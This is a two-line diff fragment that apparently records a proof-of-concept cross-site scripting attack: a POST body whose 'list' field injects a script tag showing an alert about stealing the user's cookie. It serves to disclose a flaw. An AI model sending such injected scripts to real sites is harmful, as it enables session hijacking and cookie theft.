@@ -1,0 +1,2 @@
+POC POST request:
+list=&lt;script&gt;alert(&#039;i could get your cookie&#039;)&lt;/script&gt;&amp;submit=submit
